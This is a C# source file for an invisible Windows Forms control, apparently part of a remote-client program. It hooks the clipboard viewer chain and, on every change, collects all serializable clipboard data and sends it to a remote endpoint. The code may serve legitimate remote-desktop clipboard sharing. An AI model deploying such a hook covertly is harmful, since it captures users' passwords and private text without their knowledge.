using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RemoteClient
{
    public partial class ClipHook : Control
    {
        IntPtr nextClipboardViewer;

        public ClipHook()
        {
            this.Visible = false;
        }

        public void Hook()
        {
            nextClipboardViewer = (IntPtr)SetClipboardViewer((int)this.Handle);
        }

        public void UnHook()
        {
            Dispose();
        }

        protected override void Dispose(bool disposing)
        {
            ChangeClipboardChain(this.Handle, nextClipboardViewer);
        }

        [DllImport("User32.dll")]
        protected static extern int SetClipboardViewer(int hWndNewViewer);

        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        public static extern bool ChangeClipboardChain(IntPtr hWndRemove, IntPtr hWndNewNext);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SendMessage(IntPtr hwnd, int wMsg, IntPtr wParam, IntPtr lParam);

        protected override void WndProc(ref System.Windows.Forms.Message m)
        {
            const int WM_DRAWCLIPBOARD = 0x308;
            const int WM_CHANGECBCHAIN = 0x030D;

            switch (m.Msg)
            {
                case WM_DRAWCLIPBOARD:
                    CheckandSend();
                    SendMessage(nextClipboardViewer, m.Msg, m.WParam, m.LParam);
                    break;

                case WM_CHANGECBCHAIN:
                    if (m.WParam == nextClipboardViewer)
                        nextClipboardViewer = m.LParam;
                    else
                        SendMessage(nextClipboardViewer, m.Msg, m.WParam, m.LParam);
                    break;

                default:
                    base.WndProc(ref m);
                    break;
            }
        }

        public void CheckandSend()
        {
            try
            {
                ArrayList dataObjects = new ArrayList();
                IDataObject clipboardData = Clipboard.GetDataObject();

                if (clipboardData != null)
                {
                    string[] formats = clipboardData.GetFormats();
                    for (int i = 0; i < formats.Length; i++)
                    {
                        object clipboardItem = clipboardData.GetData(formats[i]);
                        if (clipboardItem != null && clipboardItem.GetType().IsSerializable)
                        {
                            dataObjects.Add(formats[i]);
                            dataObjects.Add(clipboardItem);
                        }
                    }

                    RemoteClient.SendMessage(new global::DataObject
                    {
                        CommandType = "Clipboard",
                        CommandName = "data",
                        CommandData = dataObjects
                    });
                }
            }
            catch (Exception e)
            {
                RemoteClient.LogError(e.ToString());
            }
        }
    }

    public class ClipboardChangedEventArgs : EventArgs
    {
        public readonly IDataObject DataObject;

        public ClipboardChangedEventArgs(IDataObject dataObject)
        {
            DataObject = dataObject;
        }
    }
}
